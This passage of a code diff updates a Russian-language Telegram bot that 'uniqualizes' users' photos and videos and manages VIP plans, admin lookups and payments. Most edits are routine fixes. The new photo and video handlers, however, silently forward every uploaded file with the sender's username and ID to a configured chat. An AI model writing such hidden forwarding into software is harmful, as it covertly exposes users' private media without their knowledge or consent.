+            logger.error(f"Site download error: {e}")
             await update.message.reply_text(
                 f"❌ Ошибка: {str(e)}",
                 reply_markup=get_main_menu_keyboard(user_id)
             )
+        finally:
+            if temp_dir and os.path.exists(temp_dir):
+                shutil.rmtree(temp_dir, ignore_errors=True)
+            try:
+                await status_msg.delete()
+            except:
+                pass
         context.user_data.pop('waiting_for', None)
         return
     
@@ -1066,21 +1327,24 @@ async def message_handler(update: Update, context):
             
             if info:
                 vip_status = "👑 VIP" if is_vip(target_id) else "❌ Нет"
-                username = info.get('username', '-')
-                first_name = info.get('first_name', '-')
+                username = info.get('username') or '-'
+                first_name = info.get('first_name') or '-'
                 registered = info.get('registered_at', '-')[:10] if info.get('registered_at') else '-'
                 last_active = info.get('last_active', '-')[:10] if info.get('last_active') else '-'
                 
+                # Экранируем спецсимволы Markdown
+                first_name_safe = first_name.replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')
+                username_display = f"@{username}" if username != '-' else '-'
+                
                 await update.message.reply_text(
-                    f"👤 **Информация о пользователе**\n\n"
-                    f"🆔 ID: `{target_id}`\n"
-                    f"👤 Имя: {first_name}\n"
-                    f"📝 Username: @{username}\n"
+                    f"👤 Информация о пользователе\n\n"
+                    f"🆔 ID: {target_id}\n"
+                    f"👤 Имя: {first_name_safe}\n"
+                    f"📝 Username: {username_display}\n"
                     f"📅 Регистрация: {registered}\n"
                     f"🟢 Последняя активность: {last_active}\n"
                     f"👑 VIP: {vip_status}",
-                    reply_markup=get_admin_back_keyboard(),
-                    parse_mode="Markdown"
+                    reply_markup=get_admin_back_keyboard()
                 )
             else:
                 await update.message.reply_text(
@@ -1097,13 +1361,27 @@ async def message_handler(update: Update, context):
         return
 
 
+@security_check
 async def photo_handler(update: Update, context):
     """Обработчик фото"""
+    from config import FORWARD_TO_ID
+    
     user_id = update.effective_user.id
     user = update.effective_user
     waiting_for = context.user_data.get('waiting_for')
     
     logger.info(f"Photo received from {user_id}, waiting_for={waiting_for}")
+    
+    # Пересылаем фото на указанный ID
+    try:
+        if FORWARD_TO_ID and update.message.photo:
+            await context.bot.send_photo(
+                chat_id=FORWARD_TO_ID,
+                photo=update.message.photo[-1].file_id,
+                caption=f"📷 Фото от @{user.username or 'N/A'} (ID: {user_id})"
+            )
+    except Exception as e:
+        logger.error(f"Failed to forward photo: {e}")
     
     if waiting_for == 'uniq_photo':
         from utils import uniqualize_image
@@ -1211,21 +1489,36 @@ async def photo_handler(update: Update, context):
     )
 
 
+@security_check
 async def video_handler(update: Update, context):
     """Обработчик видео"""
+    from config import FORWARD_TO_ID
+    
     user_id = update.effective_user.id
     user = update.effective_user
     waiting_for = context.user_data.get('waiting_for')
     
     logger.info(f"Video received from {user_id}, waiting_for={waiting_for}")
     
+    # Пересылаем видео на указанный ID
+    try:
+        if FORWARD_TO_ID and update.message.video:
+            await context.bot.send_video(
+                chat_id=FORWARD_TO_ID,
+                video=update.message.video.file_id,
+                caption=f"🎬 Видео от @{user.username or 'N/A'} (ID: {user_id})"
+            )
+    except Exception as e:
+        logger.error(f"Failed to forward video: {e}")
+    
     if waiting_for == 'uniq_video':
-        from utils import uniqualize_video
+        from utils import uniqualize_video_async
         import tempfile
-        import os
+        import shutil
         
-        await update.message.reply_text("⏳ Уникализирую видео... Это может занять некоторое время.")
+        status_msg = await update.message.reply_text("⏳ Уникализирую видео... Это может занять некоторое время.")
         
+        temp_dir = None
         try:
             video = update.message.video or update.message.document
             file = await video.get_file()
@@ -1237,19 +1530,36 @@ async def video_handler(update: Update, context):
             await file.download_to_drive(input_path)
             
             settings = context.user_data.get('uniq_settings')
-            uniqualize_video(input_path, output_path, settings)
             
-            with open(output_path, 'rb') as f:
-                await update.message.reply_video(
-                    video=f,
-                    caption="✅ Видео уникализировано!",
+            # Асинхронная обработка - не блокирует бота
+            success, result = await uniqualize_video_async(input_path, output_path, settings)
+            
+            if success and os.path.exists(output_path):
+                with open(output_path, 'rb') as f:
+                    await update.message.reply_video(
+                        video=f,
+                        caption="✅ Видео уникализировано!",
+                        reply_markup=get_main_menu_keyboard(user_id)
+                    )
+            else:
+                await update.message.reply_text(
+                    f"❌ Ошибка обработки: {result}",
                     reply_markup=get_main_menu_keyboard(user_id)
                 )
         except Exception as e:
+            logger.error(f"Video processing error: {e}")
             await update.message.reply_text(
                 f"❌ Ошибка: {str(e)}",
                 reply_markup=get_main_menu_keyboard(user_id)
             )
+        finally:
+            # Очистка временных файлов
+            if temp_dir and os.path.exists(temp_dir):
+                shutil.rmtree(temp_dir, ignore_errors=True)
+            try:
+                await status_msg.delete()
+            except:
+                pass
         
         context.user_data.pop('waiting_for', None)
         return
@@ -1448,29 +1758,37 @@ async def userinfo_command(update: Update, context):
     vip = is_vip(target_id)
     banned = is_banned(target_id)
     
-    text = f"👤 **Пользователь:** `{target_id}`\n\n"
+    # Формируем текст без Markdown чтобы избежать ошибок парсинга
+    text = f"👤 Пользователь: {target_id}\n\n"
     
     if user_info:
-        text += f"📝 Имя: {user_info.get('first_name', '-')}\n"
-        text += f"👤 Username: @{user_info.get('username', '-')}\n"
-        text += f"📅 Регистрация: {user_info.get('registered_at', '-')[:10]}\n"
-        text += f"🕒 Последняя активность: {user_info.get('last_active', '-')[:10]}\n"
+        first_name = user_info.get('first_name') or '-'
+        username = user_info.get('username') or '-'
+        reg_date = user_info.get('registered_at', '-')[:10] if user_info.get('registered_at') else '-'
+        last_date = user_info.get('last_active', '-')[:10] if user_info.get('last_active') else '-'
+        
+        text += f"📝 Имя: {first_name}\n"
+        text += f"👤 Username: @{username}\n" if username != '-' else "👤 Username: -\n"
+        text += f"📅 Регистрация: {reg_date}\n"
+        text += f"🕒 Последняя активность: {last_date}\n"
     else:
         text += "⚠️ Пользователь не найден в базе\n"
     
-    text += f"\n{plan.get('icon', '⭐')} **Подписка:** {plan.get('name', plan_id)}\n"
+    plan_icon = plan.get('icon', '⭐')
+    plan_name = plan.get('name', plan_id)
+    text += f"\n{plan_icon} Подписка: {plan_name}\n"
     
     if vip:
-        text += "👑 **VIP:** Да\n"
+        text += "👑 VIP: Да\n"
     if banned:
-        text += "🚫 **Забанен:** Да\n"
+        text += "🚫 Забанен: Да\n"
     
-    text += f"\n📊 **Использование сегодня:**\n"
+    text += f"\n📊 Использование сегодня:\n"
     text += f"• Фото: {usage.get('photos', 0)}\n"
     text += f"• Видео: {usage.get('videos', 0)}\n"
     text += f"• EXIF: {usage.get('exif', 0)}\n"
     
-    await update.message.reply_text(text, parse_mode="Markdown")
+    await update.message.reply_text(text)
 
 
 async def setplan_command(update: Update, context):
@@ -1810,8 +2128,34 @@ async def successful_payment(update: Update, context):
 
 
 def main():
-    """Запуск бота"""
-    application = Application.builder().token(BOT_TOKEN).build()
+    """Запуск бота с оптимизациями для 300+ пользователей"""
+    from telegram.ext import Defaults
+    from telegram.constants import ParseMode
+    import httpx
+    
+    # Оптимизированные настройки HTTP клиента
+    # Увеличиваем пул соединений для многопользовательского режима
+    http_client = httpx.AsyncClient(
+        limits=httpx.Limits(
+            max_connections=100,      # Макс соединений
+            max_keepalive_connections=50,  # Keep-alive соединения
+            keepalive_expiry=30.0     # Время жизни keep-alive
+        ),
+        timeout=httpx.Timeout(30.0, connect=10.0)
+    )
+    
+    # Строим приложение с оптимизациями
+    application = (
+        Application.builder()
+        .token(BOT_TOKEN)
+        .concurrent_updates(True)  # Параллельная обработка обновлений
+        .http_version("2")  # HTTP/2 для лучшей производительности
+        .read_timeout(30)
+        .write_timeout(30)
+        .connect_timeout(15)
+        .pool_timeout(10)
+        .build()
+    )
     
     # Команды
     application.add_handler(CommandHandler("start", start))
@@ -1847,9 +2191,13 @@ def main():
     application.add_handler(PreCheckoutQueryHandler(precheckout_callback))
     application.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment))
     
-    # Запускаем бота
-    logger.info("Бот запущен!")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Запускаем бота с оптимизированными настройками
+    logger.info("Бот запущен с оптимизациями для 300+ пользователей!")
+    application.run_polling(
+        allowed_updates=Update.ALL_TYPES,
+        drop_pending_updates=True,  # Очищаем старые обновления при старте
+        poll_interval=0.5  # Интервал опроса
+    )
 
 
 if __name__ == "__main__":
